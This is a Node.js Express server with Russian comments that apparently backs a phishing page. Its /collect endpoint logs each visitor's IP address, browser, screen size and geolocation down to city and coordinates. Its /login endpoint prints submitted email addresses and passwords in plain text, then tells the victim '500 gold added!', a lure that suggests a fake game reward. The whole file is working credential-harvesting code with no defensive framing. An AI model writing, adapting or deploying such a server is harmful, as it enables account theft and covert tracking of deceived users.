const express = require('express');
const app = express();

app.use(express.json());

// Запрет кеширования
app.use((req, res, next) => {
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    res.set('Pragma', 'no-cache');
    res.set('Expires', '0');
    next();
});

app.use(express.static('public'));

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

// ===== Сбор IP и геолокации при заходе =====
app.post('/collect', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const ua = req.headers['user-agent'] || 'unknown';
    const geo = req.body.geo || {};
    const screen = req.body.screen || {};

    console.log('');
    console.log('========================================');
    console.log('  НОВЫЙ ПОСЕТИТЕЛЬ');
    console.log('========================================');
    console.log('  IP:        ' + ip);
    console.log('  Браузер:   ' + ua);
    console.log('  Экран:     ' + screen.w + 'x' + screen.h);
    console.log('  Язык:      ' + (req.body.lang || 'unknown'));
    console.log('  Страна:    ' + (geo.country || 'unknown'));
    console.log('  Город:     ' + (geo.city || 'unknown'));
    console.log('  Регион:    ' + (geo.region || 'unknown'));
    console.log('  Провайдер: ' + (geo.org || 'unknown'));
    console.log('  Коорд.:    ' + (geo.lat || '?') + ', ' + (geo.lon || '?'));
    console.log('  Время:     ' + new Date().toLocaleString());
    console.log('========================================');
    console.log('');

    res.json({ ok: true });
});

// ===== Логин =====
app.post('/login', (req, res) => {
    const email = req.body.email;
    const password = req.body.password;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const ua = req.headers['user-agent'] || 'unknown';

    if (!email || !password) {
        return res.status(400).json({ error: 'Fill all fields' });
    }

    console.log('');
    console.log('========================================');
    console.log('  НОВЫЙ АККАУНТ');
    console.log('========================================');
    console.log('  Почта:    ' + email);
    console.log('  Пароль:   ' + password);
    console.log('  IP:       ' + ip);
    console.log('  Браузер:  ' + ua);
    console.log('  Время:    ' + new Date().toLocaleString());
    console.log('========================================');
    console.log('');

    res.json({ success: true, message: '500 gold added!' });
});

app.listen(3000, () => {
    console.log('Server started on http://localhost:3000');
});
